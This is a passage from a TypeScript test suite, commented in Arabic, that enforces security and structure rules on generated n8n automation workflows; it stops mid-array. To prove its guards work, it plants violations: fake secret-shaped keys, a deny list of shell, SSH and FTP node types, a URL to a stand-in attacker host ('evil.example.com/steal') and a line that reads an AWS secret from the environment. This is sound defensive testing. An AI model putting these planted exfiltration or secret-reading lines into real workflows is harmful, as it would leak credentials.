// @vitest-environment node
/* eslint-disable @typescript-eslint/no-explicit-any */
/**
 * حارس عقدي على مسارات n8n المولَّدة (n8n/workflows/*.json) وREADME.
 *
 * ما يحرسه:
 *  ① المتعقَّب = المولَّد: إعادة البناء من n8n/code/*.js تطابق ما في git حرفيًّا (وكل ملف متعقَّب
 *    مولَّد، فلا ملف يتيم).
 *  ② لا أسرار ولا مفاتيح حرفية؛ الاعتمادات بالاسم فقط ({id:null,name}) ومسجَّلة.
 *  ③ لا نوع عقدة ممنوع (git وvercel وsupabase وpostgres وexecuteCommand وssh...) ولا خارج القائمة
 *    المسموحة؛ ولا مضيف HTTP خارج المعتمد؛ ولا كشط HTML لمحرّكات البحث.
 *  ④ كل ويب هوك يبلغ Respond على النجاح **وعلى كل مسار خطأ** (قابلية البلوغ على الرسم).
 *  ⑤ معرّفات الكتالوج = قواعد Switch = قائمة العقد (خمسة بالضبط) مع مخرج احتياطي unknown_workflow.
 *  ⑥ التعابير بسيطة (أربعة أشكال)، والوحدات المضمَّنة تطابق ملفاتها، وفصل سرّي النطاقين.
 *  ⑦ README العربي: أقسام، بلا شرطة طويلة ولا اسم سابق، وكل اعتماد/متغيّر مذكور.
 *  ⑧ شكل ناتج HTTP كما يسلّمه n8n الحقيقي (data لا body، وJSON.stringify لحقلي query/headers)،
 *    وعزل الأسرار (لا $env سرّ خارج التحقق والتوقيع، ولا خروج شبكي من Code، ولا سرّ في الردّ)،
 *    ومضيفون مثبَّتون حرفيًّا وعناوين ديناميكية بالتطابق التام، وترتيب الفروع بالإحداثيات،
 *    ونصوص ظاهرة بلا شرطة طويلة ولا اسم سابق في كل مصدر لا في README وحده.
 *
 * المادة ٣٠: كل حارس يُجرَّب على انتهاك مزروع عمدًا ويجب أن يحمرّ. لا حارس بلا إثبات.
 */
import { readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import {
  CATALOG_CONTRACT,
  CONTRACT_PATHS,
  DYNAMIC_TIMEOUT,
  PINNED_HTTP_HOSTS,
  checkAllowedHostsPinned,
  checkBranchOrder,
  checkCatalog,
  checkCodeNodes,
  checkCredentialsByName,
  checkDomainSeparation,
  checkEmbeddedModules,
  checkEnvAccess,
  checkEnvNames,
  checkExpressions,
  checkForbiddenTypes,
  checkHeartbeatFirst,
  checkHttpHosts,
  checkHttpNodes,
  checkInvisible,
  checkKeyedBeforeKeyless,
  checkNoScraping,
  checkProfile,
  checkReadme,
  checkRespondNodes,
  checkSecrets,
  checkSettings,
  checkVisibleText,
  checkWebhookContract,
  checkWorkflow,
  egressProblems,
  embeddedModules,
  secretLeakProblems,
} from "../test-support/contract-checks.js";
import { checkEveryPathResponds, typeName } from "../test-support/graph.js";
import {
  CREDENTIALS,
  ENV_DOC,
  WORKFLOW_FILES,
  buildAll,
} from "../../scripts/build-n8n-workflows.mjs";
import { ROOT, built, loadCode, workflowByName } from "./helpers.js";

const WF_DIR = join(ROOT, "n8n", "workflows");
const clone = (x: any) => JSON.parse(JSON.stringify(x));
const NAMES = Object.keys(WORKFLOW_FILES);
const textOf = (name: string, profile = "prod") =>
  built(profile).files[WORKFLOW_FILES[name as keyof typeof WORKFLOW_FILES]];

/** يضيف عقدة بنوع محدّد إلى المسار (غير موصولة) لإثبات أن الحارس يلتقط النوع. */
function addNode(wf: any, type: string, extra: any = {}) {
  wf.nodes.push({
    id: "planted",
    name: "Planted " + type,
    type,
    typeVersion: 1,
    position: [0, 0],
    parameters: {},
    ...extra,
  });
  return wf;
}
const node = (wf: any, name: string) => {
  const n = wf.nodes.find((x: any) => x.name === name);
  if (!n) throw new Error("لا عقدة " + name);
  return n;
};

// ---------------------------------------------------------------------------
describe("① المتعقَّب يطابق المولَّد", () => {
  const generated = buildAll("prod");

  it("المجموعة غير فارغة: ستة مسارات", () => {
    expect(NAMES.length).toBe(6);
    expect(Object.keys(generated.files).length).toBe(6);
  });

  for (const name of NAMES) {
    it(
      "n8n/workflows/" +
        WORKFLOW_FILES[name as keyof typeof WORKFLOW_FILES] +
        " يطابق إعادة البناء حرفيًّا",
      () => {
        const committed = readFileSync(
          join(WF_DIR, WORKFLOW_FILES[name as keyof typeof WORKFLOW_FILES]),
          "utf8",
        );
        expect(committed === textOf(name)).toBe(true);
      },
    );
  }

  it("n8n/README.md يطابق المولَّد حرفيًّا", () => {
    expect(readFileSync(join(ROOT, "n8n", "README.md"), "utf8") === generated.readme).toBe(true);
  });

  it("لا ملف JSON يتيم في n8n/workflows", () => {
    const files = readdirSync(WF_DIR).sort();
    expect(files).toEqual(Object.values(WORKFLOW_FILES).sort());
  });

  it("الإخراج حتمي: بناءان متتاليان متطابقان، والمفاتيح مرتّبة، والمعرّفات مستقرة", () => {
    const again = buildAll("prod");
    expect(again.files).toEqual(generated.files);
    const wf = JSON.parse(generated.files["sadeed-web-research.json"]);
    const keys = Object.keys(wf);
    expect(keys).toEqual([...keys].sort());
    const ids = wf.nodes.map((n: any) => n.id);
    expect(new Set(ids).size).toBe(ids.length);
    for (const id of ids)
      expect(id).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-a[0-9a-f]{3}-[0-9a-f]{12}$/);
  });

  it("ملف stub حتمي ويختلف عن prod", () => {
    const a = buildAll("stub");
    expect(buildAll("stub").files).toEqual(a.files);
    expect(a.files["sadeed-web-research.json"]).not.toEqual(
      generated.files["sadeed-web-research.json"],
    );
  });

  it("RED: تعديل حرف واحد في المتعقَّب يُلتقط بالمقارنة", () => {
    const committed = readFileSync(join(WF_DIR, "sadeed-web-research.json"), "utf8");
    const planted = committed.replace('"executionTimeout": 10', '"executionTimeout": 11');
    expect(planted).not.toEqual(committed);
    expect(planted === textOf("sadeed-web-research")).toBe(false);
  });

  it("RED: تعديل شيفرة وحدة دون إعادة التوليد يُلتقط (الوحدة المضمَّنة ≠ ملفها)", () => {
    const wf = workflowByName("sadeed-web-research");
    node(wf, "Verify").parameters.jsCode = node(wf, "Verify").parameters.jsCode.replace(
      "SKEW_MS = 30000",
      "SKEW_MS = 99999",
    );
    expect(checkEmbeddedModules(wf).join("|")).toContain("تخالف n8n/code/verify-request.js");
  });
});

// ---------------------------------------------------------------------------
describe("② الأسرار والاعتمادات بالاسم", () => {
  for (const name of NAMES) {
    for (const profile of ["prod", "stub"]) {
      it(name + " (" + profile + "): كل الحرّاس خضراء", () => {
        const wf = JSON.parse(textOf(name, profile));
        expect(checkWorkflow(wf, textOf(name, profile), profile)).toEqual([]);
      });
    }
  }

  it("الاعتمادات المستعملة مجموعة غير فارغة ومسجَّلة كلها", () => {
    const used = new Set<string>();
    for (const name of NAMES) {
      for (const n of JSON.parse(textOf(name)).nodes)
        for (const ref of Object.values(n.credentials || {}) as any[]) used.add(ref.name);
    }
    expect(used.size).toBeGreaterThanOrEqual(7);
    const registered = new Set(Object.values(CREDENTIALS).map((c: any) => c.name));
    for (const u of used) expect(registered.has(u)).toBe(true);
    for (const r of registered) expect(used.has(r as string)).toBe(true);
  });

  it("ملف stub بلا أي اعتماد، وprod فيه مراجع {id:null,name} فقط", () => {
    for (const name of NAMES) {
      for (const n of JSON.parse(textOf(name, "stub")).nodes) expect(n.credentials).toBeUndefined();
    }
    const brave = node(JSON.parse(textOf("sadeed-web-research")), "HTTP Brave");
    expect(brave.credentials).toEqual({
      httpHeaderAuth: { id: null, name: "Nx Brave Search Key" },
    });
  });

  const secretPlants: [string, (wf: any) => void, RegExp | string][] = [
    [
      "مفتاح OpenAI حرفي في شيفرة",
      (wf) => {
        node(wf, "Plan").parameters.jsCode += '\nconst k = "' + "s" + "k-" + "a1".repeat(18) + '";';
      },
      "شكل سرّ حرفي",
    ],
    [
      "مفتاح Google حرفي",
      (wf) => {
        node(wf, "Plan").parameters.jsCode +=
          '\nconst k = "' + "AI" + "za" + "Sy".repeat(18) + '";';
      },
      "شكل سرّ حرفي",
    ],
    [
      "رمز GitHub حرفي",
      (wf) => {
        node(wf, "Plan").parameters.jsCode +=
          '\nconst k = "' + "gh" + "p_" + "a1".repeat(19) + '";';
      },
      "شكل سرّ حرفي",
    ],
    [
      "Bearer حرفي",
      (wf) => {
        node(wf, "HTTP Tavily").parameters.sendHeaders = true;
        node(wf, "HTTP Tavily").parameters.jsonHeaders =
          '{"Authorization":"Bear' + "er " + "abcd".repeat(7) + '"}';
      },
      "شكل سرّ حرفي",
    ],
    [
      "مفتاح Tavily حرفي",
      (wf) => {
        node(wf, "Plan").parameters.jsCode +=
          '\nconst k = "' + "tv" + "ly-" + "ab".repeat(8) + '";';
      },
      "شكل سرّ حرفي",
    ],
    [
      "سلسلة سداسية طويلة (40)",
      (wf) => {
        node(wf, "Plan").parameters.jsCode += '\nconst k = "' + "ab12".repeat(10) + '";';
      },
      "سلسلة سداسية طويلة",
    ],
    [
      "قيمة حرفية في حقل apiKey",
      (wf) => {
        node(wf, "HTTP Google").parameters.apiKey = "literal-value";
      },
      "قيمة حرفية في حقل حسّاس",
    ],
    [
      "قيمة حرفية في حقل Authorization",
      (wf) => {
        node(wf, "HTTP Brave").parameters.authorization = "xyz";
      },
      "قيمة حرفية في حقل حسّاس",
    ],
  ];
  for (const [label, plant, expected] of secretPlants) {
    it("RED: " + label, () => {
      const wf = workflowByName("sadeed-web-research");
      plant(wf);
      expect(checkSecrets(wf, JSON.stringify(wf)).join("|")).toContain(expected as string);
    });
  }

  const credPlants: [string, (wf: any) => void, string][] = [
    [
      "id غير null",
      (wf) => {
        node(wf, "HTTP Brave").credentials.httpHeaderAuth.id = "123";
      },
      "يجب أن يكون null",
    ],
    [
      "مفتاح إضافي في مرجع الاعتماد",
      (wf) => {
        node(wf, "HTTP Brave").credentials.httpHeaderAuth.value = "k";
      },
      "بمفاتيح غير (id,name)",
    ],
    [
      "اسم غير مسجَّل",
      (wf) => {
        node(wf, "HTTP Brave").credentials.httpHeaderAuth.name = "My Personal Key";
      },
      "اسم اعتماد غير مسجَّل",
    ],
  ];
  for (const [label, plant, expected] of credPlants) {
    it("RED: " + label, () => {
      const wf = workflowByName("sadeed-web-research");
      plant(wf);
      expect(checkCredentialsByName(wf).join("|")).toContain(expected);
    });
  }

  it("سرّا النطاقين منفصلان ومقروءان من البيئة: RED على التبديل", () => {
    for (const name of ["sadeed-web-research", "fnn-dev-research", "fnn-automation-runner"]) {
      expect(checkDomainSeparation(workflowByName(name))).toEqual([]);
    }
    const swapped = workflowByName("fnn-dev-research");
    for (const n of swapped.nodes)
      if (typeName(n) === "code")
        n.parameters.jsCode = n.parameters.jsCode
          .split("FINN_N8N_SECRET")
          .join("SADEED_N8N_SECRET");
    expect(checkDomainSeparation(swapped).length).toBeGreaterThan(0);
    const mixed = workflowByName("sadeed-web-research");
    node(mixed, "Sign").parameters.jsCode += "\n$env.FINN_N8N_SECRET;";
    expect(checkDomainSeparation(mixed).length).toBeGreaterThan(0);
  });

  it("الأسماء الحرفية للأسرار في الأعراف: SADEED_N8N_SECRET وFINN_N8N_SECRET", () => {
    const documented = ENV_DOC.map((e: string[]) => e[0]);
    expect(documented).toContain("SADEED_N8N_SECRET");
    expect(documented).toContain("FINN_N8N_SECRET");
  });
});

// ---------------------------------------------------------------------------
describe("③ لا عقد ممنوعة، لا مضيف غريب، لا كشط", () => {
  const forbidden = [
    "git",
    "github",
    "gitlab",
    "vercel",
    "supabase",
    "postgres",
    "executeCommand",
    "ssh",
    "mysql",
    "mongoDb",
    "redis",
    "ftp",
    "executeWorkflow",
  ];
  it("القائمة الممنوعة غير فارغة", () => expect(forbidden.length).toBeGreaterThan(10));
  for (const t of forbidden) {
    it("RED: عقدة " + t + " تُلتقط", () => {
      const wf = addNode(workflowByName("fnn-automation-runner"), "n8n-nodes-base." + t);
      expect(checkForbiddenTypes(wf).join("|")).toContain("ممنوع");
    });
  }
  it("RED: نوع خارج القائمة المسموحة (readBinaryFile)", () => {
    const wf = addNode(workflowByName("fnn-automation-runner"), "n8n-nodes-base.readBinaryFile");
    expect(checkForbiddenTypes(wf).join("|")).toContain("خارج القائمة المسموحة");
  });
  it("الأنواع المستعملة فعلًا مجموعة غير فارغة وكلها مسموحة", () => {
    const used = new Set<string>();
    for (const name of NAMES) for (const n of JSON.parse(textOf(name)).nodes) used.add(typeName(n));
    expect(used.size).toBeGreaterThanOrEqual(12);
    for (const name of NAMES) expect(checkForbiddenTypes(JSON.parse(textOf(name)))).toEqual([]);
  });

  it("لا كتابة إلى قاعدة بيانات ولا نشر: لا عقدة HTTP تتجه إلى Supabase/Vercel/Lovable/كتابة GitHub", () => {
    let httpNodes = 0;
    for (const name of NAMES) {
      for (const n of JSON.parse(textOf(name)).nodes) {
        if (typeName(n) !== "httpRequest") continue;
        httpNodes += 1;
        const url = String(n.parameters.url);
        expect(url).not.toMatch(/supabase|vercel|lovable|api\.github\.com\/(repos|user|git|orgs)/);
        expect(n.parameters.method).toMatch(/^(GET|POST)$/);
      }
    }
    expect(httpNodes).toBeGreaterThanOrEqual(15);
  });

  it("RED: مضيف HTTP غريب", () => {
    const wf = workflowByName("sadeed-web-research");
    node(wf, "HTTP Google").parameters.url = "https://evil.example.com/steal";
    expect(checkHttpHosts(wf).join("|")).toContain("خارج القائمة المعتمدة");
  });
  it("RED: عنوان http غير مشفّر", () => {
    const wf = workflowByName("sadeed-web-research");
    node(wf, "HTTP Google").parameters.url = "http://www.googleapis.com/customsearch/v1";
    expect(checkHttpHosts(wf).join("|")).toContain("ليس https");
  });
  it("RED: تعبير عنوان غير معتمد", () => {
    const wf = workflowByName("watchdog-canary");
    node(wf, "App Health").parameters.url = "={{ $json.anything }}/x";
    expect(checkHttpHosts(wf).join("|")).toContain("غير معتمد");
    node(wf, "App Health").parameters.url = "={{ $env.OTHER_URL }}/x";
    expect(checkHttpHosts(wf).join("|")).toContain("غير معتمد");
  });

  const scraping = [
    "https://www.google.com/search?q=x",
    "https://www.bing.com/search?q=x",
    "https://duckduckgo.com/html/?q=x",
    "https://search.yahoo.com/search?p=x",
  ];
  for (const url of scraping) {
    it("RED: كشط محرّك بحث " + url, () => {
      const wf = workflowByName("sadeed-web-research");
      node(wf, "HTTP Google").parameters.url = url;
      expect(checkNoScraping(wf, JSON.stringify(wf)).length).toBeGreaterThan(0);
    });
  }
  it("RED: كشط داخل شيفرة", () => {
    const wf = workflowByName("sadeed-web-research");
    node(wf, "Plan").parameters.jsCode += '\nconst u = "https://www.google.com/search?q=" + 1;';
    expect(checkNoScraping(wf, JSON.stringify(wf)).join("|")).toContain("كشط");
  });
  it("لا نص كشط في أي مسار حقيقي", () => {
    for (const name of NAMES) {
      const wf = JSON.parse(textOf(name));
      expect(checkNoScraping(wf, textOf(name))).toEqual([]);
    }
  });

  it("RED: أحرف اتجاه/عرض صفري حرفية في المصدر أو في JSON تُلتقط", () => {
    const planted = "const x = 1;" + String.fromCharCode(0x202e) + "// hidden";
    expect(checkInvisible("وحدة", planted).join("|")).toContain("U+202E");
    expect(checkInvisible("وحدة", "a" + String.fromCharCode(0x200b) + "b").length).toBe(1);
    expect(checkInvisible("وحدة", "a" + String.fromCharCode(0xfeff)).length).toBe(1);
    expect(checkInvisible("وحدة", "line1\nline2\ttab")).toEqual([]);
  });
  it("لا أحرف خفية حرفية في أي مصدر أو مولَّد (n8n/code, test-support, tests, workflows, README, scripts)", () => {
    const dirs = ["n8n/code", "n8n/test-support", "n8n/tests", "n8n/workflows"];
    const files: string[] = [
      join(ROOT, "n8n", "README.md"),
      join(ROOT, "scripts", "build-n8n-workflows.mjs"),
      join(ROOT, "scripts", "n8n-sign-example.mjs"),
    ];
    for (const d of dirs)
      for (const f of readdirSync(join(ROOT, d)))
        if (/\.(js|mjs|ts|json)$/.test(f)) files.push(join(ROOT, d, f));
    expect(files.length).toBeGreaterThan(20);
    for (const f of files) expect(checkInvisible(f, readFileSync(f, "utf8"))).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
describe("④ كل ويب هوك يبلغ Respond على النجاح وعلى كل مسار خطأ", () => {
  for (const name of Object.keys(CONTRACT_PATHS)) {
    it(name + ": البلوغ سليم", () => {
      expect(checkEveryPathResponds(workflowByName(name))).toEqual([]);
    });
  }

  it("المسارات الثلاثة تحمل المسارات المغلقة بالعقد وPOST فقط", () => {
    const paths: Record<string, string> = {};
    for (const name of Object.keys(CONTRACT_PATHS)) {
      const hook = workflowByName(name).nodes.find((n: any) => typeName(n) === "webhook");
      paths[name] = hook.parameters.path;
      expect(hook.parameters.httpMethod).toBe("POST");
      expect(hook.parameters.responseMode).toBe("responseNode");
    }
    expect(paths).toEqual({
      "sadeed-web-research": "sadeed-research-v1",
      "fnn-dev-research": "fnn-research-v1",
      "fnn-automation-runner": "fnn-runner-v1",
    });
  });

  it("المسارات الأخرى بلا ويب هوك (المراقب ومعالج الأخطاء والفحص الذاتي)", () => {
    for (const name of ["watchdog-canary", "error-handler", "nx-self-test"]) {
      expect(workflowByName(name).nodes.some((n: any) => typeName(n) === "webhook")).toBe(false);
    }
  });

  const plants: [string, string, (wf: any) => void, string][] = [
    [
      "sadeed-web-research",
      "حذف اتصال مخرج «Plan ok?» الخاطئ (bad_request بلا ردّ)",
      (wf) => {
        wf.connections["Plan ok?"].main[1] = [];
      },
      "معلَّق",
    ],
    [
      "sadeed-web-research",
      "حذف اتصال مخرج الخطأ في Rank",
      (wf) => {
        wf.connections["Rank"].main[1] = [];
      },
      "معلَّق",
    ],
    [
      "sadeed-web-research",
      "إزالة onError من Verify",
      (wf) => {
        delete node(wf, "Verify").onError;
      },
      "قد تفشل بلا onError",
    ],
    [
      "sadeed-web-research",
      "إزالة onError من HTTP Google",
      (wf) => {
        delete node(wf, "HTTP Google").onError;
      },
      "قد تفشل بلا onError",
    ],
    [
      "sadeed-web-research",
      "قطع Join عن Rank (فرع بلا ردّ)",
      (wf) => {
        wf.connections["Join"].main[0] = [];
      },
      "معلَّق",
    ],
    [
      "sadeed-web-research",
      "توجيه مخرج خطأ Sign إلى عقدة ميتة",
      (wf) => {
        addNode(wf, "n8n-nodes-base.noOp");
        wf.connections["Sign"].main[1] = [
          { node: "Planted n8n-nodes-base.noOp", type: "main", index: 0 },
        ];
      },
      "لا تبلغ أي Respond",
    ],
    [
      "sadeed-web-research",
      "حذف عقدتي Respond",
      (wf) => {
        wf.nodes = wf.nodes.filter((n: any) => typeName(n) !== "respondToWebhook");
        wf.connections["Sign"].main[0] = [];
        wf.connections["Sign"].main[1] = [];
        wf.connections["Envelope"].main[1] = [];
      },
      "لا عقدة Respond",
    ],
    [
      "sadeed-web-research",
      "responseMode ليس responseNode",
      (wf) => {
        node(wf, "Webhook").parameters.responseMode = "onReceived";
      },
      "responseMode",
    ],
    [
      "sadeed-web-research",
      "httpMethod ليس POST",
      (wf) => {
        node(wf, "Webhook").parameters.httpMethod = "GET";
      },
      "httpMethod",
    ],
    [
      "fnn-automation-runner",
      "حذف مخرج Switch الاحتياطي",
      (wf) => {
        wf.connections["Switch Workflow"].main.pop();
      },
      "معلَّق",
    ],
    [
      "fnn-automation-runner",
      "قطع مخرج فرع الإشعار عن Record",
      (wf) => {
        wf.connections["Summarise Notify"].main[0] = [];
      },
      "معلَّق",
    ],
    [
      "fnn-automation-runner",
      "إزالة onError من Dispatch",
      (wf) => {
        delete node(wf, "Dispatch").onError;
      },
      "قد تفشل بلا onError",
    ],
  ];
  for (const [name, label, plant, expected] of plants) {
    it("RED: " + name + ": " + label, () => {
      const wf = workflowByName(name);
      plant(wf);
      expect(checkEveryPathResponds(wf).join("|")).toContain(expected);
    });
  }

  it("RED: عقدة HTTP بلا onError/مهلة/neverError تُلتقط", () => {
    const wf = workflowByName("sadeed-web-research");
    delete node(wf, "HTTP Brave").onError;
    delete node(wf, "HTTP Tavily").parameters.options.timeout;
    node(wf, "HTTP Google").parameters.options.response.response.neverError = false;
    node(wf, "HTTP Keyless").parameters.options.timeout = 1200;
    const problems = checkHttpNodes(wf, DYNAMIC_TIMEOUT).join("|");
    expect(problems).toContain("بلا onError");
    expect(problems).toContain("مهلة HTTP ليست مهلة البوّابة");
    expect(problems).toContain("neverError");
    const runner = workflowByName("fnn-automation-runner");
    node(runner, "HTTP Digest").parameters.options.timeout = 300000;
    expect(checkHttpNodes(runner, 0).join("|")).toContain("مهلة HTTP غائبة أو خارج الحدود");
    node(runner, "HTTP Digest").parameters.options.timeout = 8000;
    expect(checkHttpNodes(runner, 7000).join("|")).toContain("ليست 7000");
  });
  it("المهل: عقد البحث بمهلة البوّابة (ما تبقّى من الموعد الداخلي)، وغيرها بمهلة ثابتة محدودة", () => {
    for (const name of ["sadeed-web-research", "fnn-dev-research"]) {
      let count = 0;
      for (const n of workflowByName(name).nodes) {
        if (typeName(n) !== "httpRequest") continue;
        count += 1;
        expect(n.parameters.options.timeout).toBe("={{ $json.timeoutMs }}");
      }
      expect(count).toBeGreaterThanOrEqual(4);
    }
    for (const name of ["fnn-automation-runner", "watchdog-canary"]) {
      for (const n of workflowByName(name).nodes) {
        if (typeName(n) !== "httpRequest") continue;
        expect(Number.isInteger(n.parameters.options.timeout)).toBe(true);
        expect(n.parameters.options.timeout).toBeLessThanOrEqual(8000);
      }
    }
  });
  it("RED: مسار ويب هوك غير مطابق للعقد أو ويب هوك زائد", () => {
    const wf = workflowByName("sadeed-web-research");
    node(wf, "Webhook").parameters.path = "sadeed-research-v2";
    expect(checkWebhookContract(wf).join("|")).toContain("sadeed-research-v1");
    const extra = workflowByName("watchdog-canary");
    addNode(extra, "n8n-nodes-base.webhook", { parameters: { path: "x" } });
    expect(checkWebhookContract(extra).join("|")).toContain("غير متوقع");
  });
  it("RED: إعدادات المسار: مفعّل، حفظ بيانات النجاح، بلا مهلة تنفيذ", () => {
    const wf = workflowByName("sadeed-web-research");
    wf.active = true;
    wf.settings.saveDataSuccessExecution = "all";
    delete wf.settings.executionTimeout;
    const problems = checkSettings(wf).join("|");
    expect(problems).toContain("غير مفعّل");
    expect(problems).toContain("حفظ بيانات النجاح");
    expect(problems).toContain("executionTimeout");
  });
});

// ---------------------------------------------------------------------------
describe("⑤ الكتالوج المغلق", () => {
  const runner = () => workflowByName("fnn-automation-runner");
  const rules = (wf: any) =>
    node(wf, "Switch Workflow").parameters.rules.values.map(
      (r: any) => r.conditions.conditions[0].rightValue,
    );

  it("قواعد Switch = الكتالوج في الوحدة = قائمة العقد (خمسة بالضبط)", () => {
    const module = loadCode("runner-dispatch");
    expect(rules(runner())).toEqual(CATALOG_CONTRACT);
    expect(module.CATALOG).toEqual(CATALOG_CONTRACT);
    expect(CATALOG_CONTRACT.length).toBe(5);
    expect(checkCatalog(runner())).toEqual([]);
  });
  it("المخرج الاحتياطي unknown_workflow موصول", () => {
    const sw = node(runner(), "Switch Workflow");
    expect(sw.parameters.options).toEqual({
      fallbackOutput: "extra",
      renameFallbackOutput: "unknown_workflow",
    });
    expect(runner().connections["Switch Workflow"].main.length).toBe(6);
  });
  it("كل معرّف يصل إلى فرعه (فرع لكل مخرج، ولا فرعان لمعرّف)", () => {
    const heads = runner().connections["Switch Workflow"].main.map((o: any[]) =>
      o.map((c) => c.node),
    );
    expect(heads).toEqual([
      ["HTTP Digest"],
      ["HTTP Scan"],
      ["Purge Cache"],
      ["Canary App Health"],
      ["Notify Test"],
      ["Unknown Workflow"],
    ]);
  });
  const plants: [string, (wf: any) => void][] = [
    [
      "معرّف سادس",
      (wf) => {
        const v = node(wf, "Switch Workflow").parameters.rules.values;
        v.push(clone(v[0]));
        v[5].conditions.conditions[0].rightValue = "deploy_prod";
      },
    ],
    [
      "حذف معرّف",
      (wf) => {
        node(wf, "Switch Workflow").parameters.rules.values.pop();
      },
    ],
    [
      "إعادة تسمية معرّف",
      (wf) => {
        node(wf, "Switch Workflow").parameters.rules.values[0].conditions.conditions[0].rightValue =
          "engineering_digest2";
      },
    ],
    [
      "ترتيب مختلف",
      (wf) => {
        node(wf, "Switch Workflow").parameters.rules.values.reverse();
      },
    ],
    [
      "إزالة المخرج الاحتياطي",
      (wf) => {
        delete node(wf, "Switch Workflow").parameters.options.fallbackOutput;
      },
    ],
    [
      "اسم احتياطي مختلف",
      (wf) => {
        node(wf, "Switch Workflow").parameters.options.renameFallbackOutput = "other";
      },
    ],
  ];
  for (const [label, plant] of plants) {
    it("RED: " + label, () => {
      const wf = runner();
      plant(wf);
      expect(checkCatalog(wf).length).toBeGreaterThan(0);
    });
  }
  it("RED: كتالوج الوحدة بعد زرع معرّف سادس يخالف القائمة", () => {
    const mutated = loadCode("runner-dispatch", {
      from: '"owner_notify_test",\n];',
      to: '"owner_notify_test",\n  "deploy_prod",\n];',
    });
    expect(mutated.CATALOG).not.toEqual(CATALOG_CONTRACT);
  });
});

// ---------------------------------------------------------------------------
describe("⑥ التعابير بسيطة، والوحدات المضمَّنة وبيئة n8n موثَّقة", () => {
  it("التعابير المستعملة مجموعة غير فارغة وكلها من أربعة أشكال", () => {
    let count = 0;
    for (const name of NAMES) {
      const wf = JSON.parse(textOf(name));
      expect(checkExpressions(wf)).toEqual([]);
      for (const n of wf.nodes) count += JSON.stringify(n.parameters).split("={{").length - 1;
    }
    expect(count).toBeGreaterThan(40);
  });
  const badExpr = [
    '={{ $items("X")[0].json.a }}',
    '={{ $("Plan").first().json.x }}',
    "={{ new Date().toISOString() }}",
    "={{ $json.a.map((x) => x) }}",
    "={{ $json['a'] }}",
    "={{ $env.lower }}",
    "=plain text without braces",
  ];
  for (const expr of badExpr) {
    it("RED: تعبير " + expr, () => {
      const wf = workflowByName("sadeed-web-research");
      node(wf, "Run Google?").parameters.conditions.conditions[0].leftValue = expr;
      expect(checkExpressions(wf).length).toBeGreaterThan(0);
    });
  }

  it("الوحدات المضمَّنة في كل عقدة تطابق ملفاتها وعددها غير صفري", () => {
    let total = 0;
    for (const name of NAMES) {
      const wf = JSON.parse(textOf(name));
      expect(checkEmbeddedModules(wf)).toEqual([]);
      for (const n of wf.nodes)
        total += Object.keys(embeddedModules(n.parameters.jsCode || "")).length;
    }
    expect(total).toBeGreaterThan(30);
  });
  it("RED: وحدة معدَّلة داخل عقدة تُلتقط، ووحدة مجهولة تُلتقط", () => {
    const wf = workflowByName("fnn-automation-runner");
    node(wf, "Dispatch").parameters.jsCode = node(wf, "Dispatch").parameters.jsCode.replace(
      '"owner_notify_test",',
      '"owner_notify_test", "deploy_prod",',
    );
    expect(checkEmbeddedModules(wf).join("|")).toContain("RunnerDispatch");
    const unknown = workflowByName("sadeed-web-research");
    node(unknown, "Budget").parameters.jsCode = node(unknown, "Budget").parameters.jsCode.replace(
      "const Budget = (function",
      "const Mystery = (function",
    );
    expect(checkEmbeddedModules(unknown).join("|")).toContain("Mystery");
  });

  const documented = new Set(ENV_DOC.map((e: string[]) => e[0]));
  it("كل متغيّر بيئة مقروء في المسارات موثَّق", () => {
    const seen = new Set<string>();
    for (const name of NAMES) {
      const wf = JSON.parse(textOf(name));
      expect(checkEnvNames(wf, documented)).toEqual([]);
      for (const m of textOf(name).matchAll(/\$env\.([A-Z][A-Z0-9_]*)/g)) seen.add(m[1]);
    }
    expect(seen.size).toBeGreaterThanOrEqual(8);
  });
  it("RED: متغيّر بيئة غير موثَّق", () => {
    const wf = workflowByName("sadeed-web-research");
    node(wf, "Plan").parameters.jsCode += "\nconst leak = $env.AWS_SECRET_ACCESS_KEY;";
    expect(checkEnvNames(wf, documented).join("|")).toContain("AWS_SECRET_ACCESS_KEY");
  });

  it("RED: ملف prod فيه عنوان محلي، وstub فيه اعتماد أو مضيف حقيقي", () => {
    const prod = workflowByName("sadeed-web-research");
    node(prod, "HTTP Google").parameters.url = "http://127.0.0.1:8787/stub/www.googleapis.com/x";
    expect(checkProfile(prod, "prod", JSON.stringify(prod)).join("|")).toContain("ملف prod");
    const stub = workflowByName("sadeed-web-research", "stub");
    node(stub, "HTTP Google").credentials = {
      httpQueryAuth: { id: null, name: "Nx Google Search Key" },
    };
    node(stub, "HTTP Brave").parameters.url = "https://api.search.brave.com/res/v1/web/search";
    const problems = checkProfile(stub, "stub", JSON.stringify(stub)).join("|");
    expect(problems).toContain("اعتمادًا");
    expect(problems).toContain("مضيف حقيقي");
  });
});

// ---------------------------------------------------------------------------
describe("⑦ README العربي", () => {
  const readme = readFileSync(join(ROOT, "n8n", "README.md"), "utf8");
  const ctx = {
    credentialNames: Object.values(CREDENTIALS).map((c: any) => c.name),
    envNames: ENV_DOC.map((e: string[]) => e[0]),
  };

  it("خالٍ من المشاكل", () => {
    expect(ctx.credentialNames.length).toBe(7);
    expect(ctx.envNames.length).toBeGreaterThanOrEqual(14);
    expect(checkReadme(readme, ctx)).toEqual([]);
  });
  it("أوامر curl والاستيراد والتفعيل والتراجع موجودة بأسمائها", () => {
    for (const needle of [
      "n8n import:workflow --separate",
      "scripts/n8n-sign-example.mjs",
      "nx-self-test",
      "SADEED_WEB_RESEARCH",
      "SADEED_WEB_DISABLED",
      "N8N_ENCRYPTION_KEY",
      "WEBHOOK_URL",
      "NODE_FUNCTION_ALLOW_BUILTIN",
      "GENERIC_TIMEZONE",
      "لم يُقَس",
      "webhook/sadeed-research-v1",
    ]) {
      expect(readme).toContain(needle);
    }
  });
  const plants: [string, (t: string) => string, string][] = [
    ["شرطة طويلة", (t) => t + "\nجملة — فيها شرطة", "شرطة طويلة"],
    ["اسم منتج سابق NEXIOS", (t) => t + "\nNEXIOS", "اسم منتج سابق"],
    ["اسم المساعد السابق", (t) => t + "\nFINN", "اسم منتج سابق"],
    ["حذف قسم", (t) => t.replace("## 6) الفحص الذاتي", "## فحص"), "قسم غائب"],
    ["حذف اعتماد", (t) => t.split("Nx Brave Search Key").join("x"), "اعتماد غير مذكور"],
